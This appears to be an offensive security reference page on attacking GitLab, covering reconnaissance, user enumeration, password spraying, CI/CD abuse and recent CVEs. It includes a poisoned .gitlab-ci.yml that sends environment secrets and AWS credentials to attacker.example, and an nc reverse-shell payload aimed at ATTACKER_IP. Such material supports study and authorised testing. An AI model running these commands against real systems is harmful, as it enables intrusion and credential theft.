+++
title = 'GitLab'
date = 2026-10-30
type = 'notes'
weight = 110
toc = true
tags = ['web', 'web-technologies', 'gitlab', 'cicd']
+++

GitLab is an open-source end-to-end DevOps platform with built-in version control, issue tracking, code review, CI/CD, and more. For an attacker, it is a **high-value target** because it holds source code, CI/CD variables, deployment keys, and cloud credentials — a single GitLab compromise frequently pivots into the entire cloud estate.

> **2025–2026 context:** GitLab has produced a **steady stream of CVSS 9.0–10.0 vulnerabilities** across every layer — the GraphQL engine, the SAML implementation, the Ruby regex compiler, and the CI/CD variable system. The current attack surface is dominated by **unauthenticated RCE via Onigmo** (CVE-2026-110264, CVSS 10.0), **SAML authentication bypass** (CVE-2025-25291/25292), **GraphQL-based CI/CD variable disclosure** (CVE-2025-9825), and **personal access token leakage** through logs and public repositories (CVE-2025-13611, CVE-2025-1198).

---

## 1. Footprinting and Version Identification

There is not much to do against GitLab without knowing the version number or having a valid account.

### 1.1 Version disclosure

| Method | Detail |
|---|---|
| **`/help` page** (authenticated) | The fastest and most reliable way to read the exact version  |
| **`/opt/gitlab/version-manifest.txt`** (shell access) | Lists GitLab and every bundled library  |
| **`gitlabctl version`** (shell access) | Prints the precise CE/EE package version  |
| **`/api/v4/version`** (authenticated) | Requires a valid token |
| **Error pages / assets** | Occasionally leak version strings |

### 1.2 Registration and public projects

- Some GitLab instances allow **user registration without admin confirmation** — a free authenticated foothold.
- `/explore` lists **public projects** — check for secrets, internal documentation, and CI/CD configuration.

### 1.3 Discovery of GitLab instances

- Default path: `/users/sign_in`
- Common ports: 80, 443, 8080, 8443
- Look for the `_gitlab_session` cookie

---

## 2. User Enumeration

### 2.1 Registration form error messages

GitLab indicates when a **username is already taken** — a direct existence oracle . Automate with:

```bash
# Bash
./gitlab_userenum.sh --url http://gitlab.target.local:8081/ --userlist users.txt

# Python
python3 gitlab_userenum.py -u http://gitlab.target.local:8081/ -l users.txt
```

### 2.2 Profile page enumeration

Requesting `/<username>` returns `200` for a valid user :

```bash
for user in $(cat users.txt); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://gitlab.target/$user")
  [ "$code" = "200" ] && echo "[+] Valid: $user"
done
```

### 2.3 GraphQL API — unauthenticated disclosure

**The GraphQL endpoint (`/api/graphql`) allows unauthenticated users to enumerate all registered accounts** — usernames, email addresses, and profile information .

```bash
curl -s -X POST http://gitlab.target/api/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { nodes { username name publicEmail } } }"}'
```

> **This is a documented information-disclosure issue**, not a misconfiguration — it is enabled on many instances by default .

### 2.4 Password spraying

GitLab's default lockout is **10 failed attempts → 10-minute lockout** . Spray **one password across all users**, respecting the threshold.

```bash
# GitLab-specific tool with built-in authenticity token handling
python3 gitlab_enum_spray.py --url http://gitlab.target --userlist users.txt --password 'Welcome1'
```

---

## 3. The CI/CD Attack Surface

GitLab's CI/CD is its most distinctive attack surface — and the one that most often leads to **cloud account takeover**.

### 3.1 Poisoned Pipeline Execution (PPE)

In **Direct Pipeline Execution**, an attacker with write access to a repository **modifies `.gitlab-ci.yml`** to exfiltrate CI/CD variables, secrets, and deployment credentials to a remote server, or to export them as artifacts .

```yaml
# Malicious .gitlab-ci.yml
stages: [exfil]
exfil:
  script:
    - env | base64 | curl -X POST --data-binary @- https://attacker.example/collect
    - cat ~/.aws/credentials 2>/dev/null | curl -X POST --data-binary @- https://attacker.example/aws
```

**Prerequisites:** any role that can push to a branch protected by a pipeline, or create a merge request that triggers one.

### 3.2 CI/CD variable disclosure via GraphQL

**CVE-2025-9825** — authenticated users **without project membership** can view **sensitive manual CI/CD variables** by querying the GraphQL API. Affects **13.7 through 18.2.8, 18.3.0–18.3.3, 18.4.0–18.4.1** .

```graphql
query {
  project(fullPath: "group/project") {
    ciVariables(first: 100) {
      nodes { key value environmentScope }
    }
  }
}
```

### 3.3 Pipeline variable injection

**CVE-2025-14103** — a **Developer-role** user can set pipeline variables for **manually triggered jobs** under certain conditions — injecting malicious variables or manipulating job execution flows .

### 3.4 CI/CD cache poisoning

**CVE-2024-9183** — a **race condition in the CI/CD cache** allows an authenticated user to obtain **credentials with higher privileges** by poisoning the cache used by a privileged pipeline .

---

## 4. Notable CVEs (2025–2026)

| CVE | Severity | Type | Affected |
|---|---|---|---|
| **CVE-2026-110264** | **10.0** | **Unauthenticated RCE** — integer overflow in Onigmo (Ruby regex engine); a crafted regex executes arbitrary code  | 7.0 → 18.11.12, 19.0–19.3 |
| **CVE-2025-27407** | **9.0** | Code injection in `graphql-ruby` — authenticated user executes code via **Direct Transfer** of a malicious project  | Fixed 17.9.2, 17.8.5, 17.7.7 |
| **CVE-2025-25291 / 25292** | **8.8** | **SAML signature wrapping** — ReXML and Nokogiri parse the same XML differently → authentication bypass  | Fixed 17.9.2, 17.8.5, 17.7.7 |
| **CVE-2025-9825** | High | GraphQL CI/CD variable disclosure — non-member reads **manual variables**  | 13.7–18.2.8, 18.3.0–18.3.3, 18.4.0–18.4.1 |
| **CVE-2025-11989** | High (8.5) | Authenticated user executes unauthorized **quick actions** via a malicious description  | 17.6.0–18.3.4, 18.4.0–18.4.2, 18.5.0 |
| **CVE-2025-13611** | High | Authenticated user with log access obtains **sensitive tokens**  | 13.2–18.5.4, 18.6.0–18.6.2 |
| **CVE-2025-1198** | — | **Revoked PATs** continue to access streaming results via long-lived ActionCable connections  | 16.11–17.6.4, 17.7.0–17.7.3, 17.8.0–17.8.1 |
| **CVE-2025-0194** | — | **Access tokens logged** when API requests are made in a specific manner  | 17.4–17.5.4, 17.6.0–17.6.2, 17.7.0 |

> **CVE-2026-110264 is the headline vulnerability.** CVSS **10.0**, **unauthenticated**, affecting **every self-managed GitLab since 7.0 (2014)**. The flaw is in **Onigmo**, the Ruby regex engine GitLab bundles and maintains — a crafted regular expression triggers an integer overflow during compilation . GitLab has not published the exact exploitation conditions, but the impact is **arbitrary code execution on the server** .

---

## 5. Exploitation

### 5.1 Unauthenticated RCE — CVE-2026-110264

**Precondition:** the target is a self-managed GitLab instance running a vulnerable version (7.0 through 18.11.12, or the affected 19.x ranges) .

The vulnerability is in the **regex compiler**, so it is reachable through **any GitLab feature that compiles a user-supplied regular expression** — search, filtering, CI/CD `rules:` expressions, and GraphQL arguments. Public exploitation details are limited; the practical approach is to:

1. **Fingerprint the version** (`/help` if authenticated, or the `version-manifest.txt` path).
2. **Identify a feature that accepts a regex** — search endpoints, `rules:if` in a pipeline, or GraphQL filters.
3. **Supply a crafted regex** that triggers the integer overflow in Onigmo.
4. **Execute arbitrary code** in the context of the GitLab Rails process.

> **Treat this as a patch-level finding first.** If the target is below the fixed versions, the vulnerability is present regardless of configuration — and no authentication is required.

### 5.2 SAML authentication bypass — CVE-2025-25291 / 25292

GitLab's SAML SSO uses `ruby-saml`, which can be made to use **two different XML parsers** (ReXML and Nokogiri) for the same input. The parsers produce different document structures, enabling a **signature-wrapping attack** that results in authentication bypass .

**Exploitation** follows the classic XSW approach covered in the SAML notes: keep the signed assertion intact, inject a forged assertion that one parser resolves and the other does not.

### 5.3 Direct Transfer code injection — CVE-2025-27407

A **code-injection flaw in `graphql-ruby`** allows an authenticated user to execute code by importing a **malicious project via Direct Transfer** .

1. Create a malicious project export (`.tar.gz`).
2. Initiate a **Direct Transfer** import.
3. The crafted GraphQL payload reaches the vulnerable `graphql-ruby` code path and executes.

> **Mitigation (if patching is not possible):** disable **Direct Transfer** .

### 5.4 Authenticated RCE — GitLab CE ≤ 13.10.2 (ExifTool)

The older, well-known authenticated RCE is still relevant on unpatched instances .

```bash
python3 gitlab_13_10_2_rce.py -t http://gitlab.target:8081 -u user -p password \
  -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 8443 >/tmp/f'
```

```bash
# Listener
nc -lvnp 8443
```

**Precondition:** a valid account on a GitLab CE ≤ 13.10.2 instance — which self-registration may provide.

### 5.5 Personal Access Token (PAT) leakage

The **Pearson breach (May 2025)** is the canonical example: a GitLab **PAT was committed to a public `.git/config` file**, granting read access to private repositories that contained **hard-coded AWS, GCP, Snowflake, and Salesforce keys** — and the attackers pivoted into production for months .

**Hunting for PATs:**

```bash
# Search public repositories for GitLab PATs
gitleaks detect --source ./repo --verbose

# TruffleHog
trufflehog gitlab --token <token> --repo https://gitlab.com/org/repo
```

**PAT format:** `glpat-` followed by 20 characters.

**Related CVEs:**

- **CVE-2025-13611** — authenticated users with log access can obtain **sensitive tokens** from log files .
- **CVE-2025-1198** — **revoked PATs** continue to work on long-lived ActionCable connections .
- **CVE-2025-0194** — access tokens logged during specific API request patterns .

---

## 6. Tooling

| Tool | Purpose |
|---|---|
| **`gitlab_userenum.sh` / `gitlab_userenum.py`** | Username enumeration via registration/error oracle  |
| **`unauthscout`** | Unauthenticated OSINT recon on GitLab (and GitHub)  |
| **`kingfisher`** | GitLab group/user repository scanning for secrets  |
| **`gitleaks` / `trufflehog`** | Secret scanning across repositories |
| **`gitlab_13_10_2_rce.py`** | Authenticated RCE for CE ≤ 13.10.2  |
| **`glab api`** | Authenticated GitLab API / GraphQL requests  |
| **Burp Suite** | GraphQL enumeration, CI/CD variable queries, SAML interception |

---

## 7. Field Notes

- **CVE-2026-110264 is the priority.** CVSS **10.0**, **unauthenticated**, affecting **every self-managed GitLab from 7.0 onward** — if the target is unpatched, this is the shortest path to server compromise .
- **GraphQL is an unauthenticated enumeration goldmine.** `/api/graphql` exposes the full user list by default on many instances .
- **CI/CD variables are the highest-value data.** CVE-2025-9825 lets a non-member read **manual CI/CD variables** via GraphQL — which frequently contain cloud keys .
- **Poisoned Pipeline Execution is the cloud pivot.** A malicious `.gitlab-ci.yml` exfiltrates every secret the pipeline can reach — often including AWS, GCP, and deployment credentials .
- **PATs are the breach vector.** Pearson lost multi-cloud access to a single token in a public `.git/config` . Search for `glpat-` in every repository and every log.
- **SAML signature wrapping is still alive.** CVE-2025-25291/25292 are the same XSW class as the SAML notes — parser differential between ReXML and Nokogiri .
- **Registration may be open.** A free account turns every authenticated vulnerability (CVE-2025-27407, CVE-2025-14103, CVE-2025-11989) into an exploitable one .
- **Lockout is 10 attempts / 10 minutes.** Password spraying must respect it — use the dedicated GitLab tools that handle the authenticity token .
- **Version first.** Every attack on this page is version-gated; read `/help` or `version-manifest.txt` before choosing a payload.
